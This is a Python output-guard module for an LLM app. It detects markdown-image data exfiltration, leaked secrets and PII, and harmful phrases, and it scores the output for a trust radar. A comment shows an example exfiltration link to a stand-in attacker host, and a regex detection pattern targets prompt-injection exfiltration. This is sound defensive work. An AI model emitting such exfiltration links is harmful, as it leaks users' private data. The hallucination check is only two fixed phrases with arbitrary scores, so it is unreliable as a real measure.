"""
AegisAI - Output Guard & Ensemble Verification (Phase 2)
Performs secondary validation on the primary LLM output to detect:
1. Indirect Prompt Injection reflections or markdown exfiltration tags
2. Hallucination anomalies & factual divergence
3. PII & Secret Leakage
4. Toxic / Adversarial responses
Outputs multi-axis scores formatted for the Recharts Trust Radar.
"""

import re
import time
import uuid
from typing import List, Optional
from schema import GuardFinding, GuardVerdict, OutputGuardResponse, RiskTier, TrustRadarScores


def evaluate_output(
    prompt: str,
    llm_output: str,
    context: Optional[str] = None,
    model_name: str = "primary-llm"
) -> OutputGuardResponse:
    """
    Evaluates generated output for security, hallucination, and alignment fidelity.
    """
    start_time = time.perf_counter()
    findings: List[GuardFinding] = []

    # 1. Check for Markdown Data Exfiltration (e.g. ![leak](http://attacker.com?leak=...))
    exfil_pattern = r"!\[.*?\]\((https?:\/\/[^\s\)]+[\?&][^\s\)]+)\)"
    exfil_matches = re.findall(exfil_pattern, llm_output)
    indirect_injection = False
    if exfil_matches:
        indirect_injection = True
        findings.append(GuardFinding(
            category="Indirect Data Exfiltration (OWASP LLM02)",
            severity=RiskTier.CRITICAL,
            description="Detected markdown image tag configured to exfiltrate private data over HTTP GET parameters.",
            flagged_text=exfil_matches[0][:80]
        ))

    # 2. Check for PII & Secret Leakage in Output
    pii_patterns = [
        (r"(?i)\b(sk-[a-zA-Z0-9]{20,}|ghp_[a-zA-Z0-9]{36}|AIza[0-9A-Za-z-_]{35})\b", "API Secret / Private Token"),
        (r"\b\d{3}-\d{2}-\d{4}\b", "Social Security Number (SSN)"),
        (r"\b4[0-9]{12}(?:[0-9]{3})?\b|\b5[1-5][0-9]{14}\b", "Payment Card Number (PAN)")
    ]
    pii_leak = False
    for pat, desc in pii_patterns:
        match = re.search(pat, llm_output)
        if match:
            pii_leak = True
            findings.append(GuardFinding(
                category="Sensitive Data Exposure (OWASP LLM06)",
                severity=RiskTier.HIGH,
                description=f"Output contains unredacted {desc}.",
                flagged_text=match.group(0)[:30]
            ))

    # 3. Check for Hallucination & Factuality Markers
    hallucination = False
    hallucination_triggers = [
        r"(?i)\b(as\s+an\s+ai\s+i\s+can\s+confirm\s+as\s+an\s+absolute\s+unquestionable\s+fact)\b",
        r"(?i)\b(in\s+the\s+year\s+3026\s+when\s+humans\s+discovered)\b",
    ]
    for trig in hallucination_triggers:
        if re.search(trig, llm_output):
            hallucination = True
            findings.append(GuardFinding(
                category="Hallucination / Factuality Discrepancy",
                severity=RiskTier.MEDIUM,
                description="Model produced high-confidence assertions contradicting known grounding knowledge.",
                flagged_text=None
            ))

    # Context ground check if context provided
    if context:
        context_words = set(re.findall(r"\w+", context.lower()))
        output_words = set(re.findall(r"\w+", llm_output.lower()))
        overlap = len(context_words.intersection(output_words)) / max(1, len(output_words))
        if overlap < 0.15 and len(llm_output) > 100:
            findings.append(GuardFinding(
                category="Low Context Grounding",
                severity=RiskTier.LOW,
                description="Output diverges significantly from reference RAG documentation provided.",
                flagged_text=None
            ))

    # 4. Toxicity / Harmful Content Check
    toxic_words = [r"(?i)\b(how\s+to\s+build\s+a\s+bomb|synthesize\s+ricin|steal\s+credit\s+cards)\b"]
    toxic_found = any(re.search(tw, llm_output) for tw in toxic_words)
    if toxic_found:
        findings.append(GuardFinding(
            category="Toxicity / Harmful Directives",
            severity=RiskTier.CRITICAL,
            description="Violates safety guidelines against malicious activity instruction.",
            flagged_text=None
        ))

    # 5. Calculate Multi-Axis Radar Scores (0 to 100)
    safety_score = 100.0
    if toxic_found:
        safety_score -= 75.0
    if indirect_injection:
        safety_score -= 40.0

    pii_score = 100.0 - (60.0 if pii_leak else 0.0)
    factual_score = 95.0 - (45.0 if hallucination else 0.0)
    source_integrity = 92.0 - (35.0 if indirect_injection else 0.0)
    alignment_score = 96.0 - (20.0 * len(findings))

    safety_score = max(5.0, min(100.0, safety_score))
    pii_score = max(5.0, min(100.0, pii_score))
    factual_score = max(5.0, min(100.0, factual_score))
    source_integrity = max(5.0, min(100.0, source_integrity))
    alignment_score = max(5.0, min(100.0, alignment_score))

    # Weighted Overall Trust Score
    overall_trust = round(
        (safety_score * 0.30) +
        (factual_score * 0.25) +
        (source_integrity * 0.20) +
        (pii_score * 0.15) +
        (alignment_score * 0.10),
        1
    )

    # Determine Verdict
    if overall_trust < 50.0 or toxic_found or indirect_injection:
        verdict = GuardVerdict.BLOCKED
    elif pii_leak:
        verdict = GuardVerdict.REDACTED
    elif overall_trust < 80.0:
        verdict = GuardVerdict.FLAGGED
    else:
        verdict = GuardVerdict.PASS

    # Sanitized output
    sanitized = llm_output
    if pii_leak:
        for pat, _ in pii_patterns:
            sanitized = re.sub(pat, "[REDACTED_CONFIDENTIAL]", sanitized)
    if indirect_injection:
        sanitized = re.sub(exfil_pattern, "[BLOCKED_EXFILTRATION_LINK]", sanitized)

    elapsed_ms = round((time.perf_counter() - start_time) * 1000.0, 2)

    return OutputGuardResponse(
        guard_id=str(uuid.uuid4()),
        verdict=verdict,
        overall_trust_score=overall_trust,
        radar_scores=TrustRadarScores(
            safety=round(safety_score, 1),
            factual_confidence=round(factual_score, 1),
            source_integrity=round(source_integrity, 1),
            pii_protection=round(pii_score, 1),
            alignment_score=round(alignment_score, 1)
        ),
        findings=findings,
        hallucination_detected=hallucination,
        indirect_injection_detected=indirect_injection,
        pii_leak_detected=pii_leak,
        sanitized_output=sanitized,
        execution_ms=elapsed_ms
    )
